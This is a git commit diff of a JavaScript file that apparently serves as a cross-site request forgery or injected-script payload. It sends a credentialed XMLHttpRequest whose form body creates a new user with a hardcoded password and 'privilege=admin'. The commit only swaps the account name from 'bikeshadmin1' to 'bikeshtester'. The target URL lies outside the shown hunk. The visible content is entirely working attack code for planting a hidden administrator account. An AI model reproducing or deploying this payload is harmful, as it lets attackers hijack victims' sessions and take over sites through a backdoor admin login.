63e52e61ee92312f85656982b126d03d5f4c8a51
bikesh08 <83470591+bikesh08@users.noreply.github.com>
2023-03-12 12:53:34 -0500

    Add files via upload

--- my.js
+++ my.js
@@ -4,7 +4,7 @@ xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
 xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3;q=0.9");
 xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
 xhr.withCredentials = true;
-var body = "uname=bikeshadmin1&email=bikeshadmin1%40gmail.com&passwd=password3443&privilege=admin";
+var body = "uname=bikeshtester&email=bikeshtester%40gmail.com&passwd=password3443&privilege=admin";
 var aBody = new Uint8Array(body.length);
 for (var i = 0; i < aBody.length; i++)
 aBody[i] = body.charCodeAt(i); 
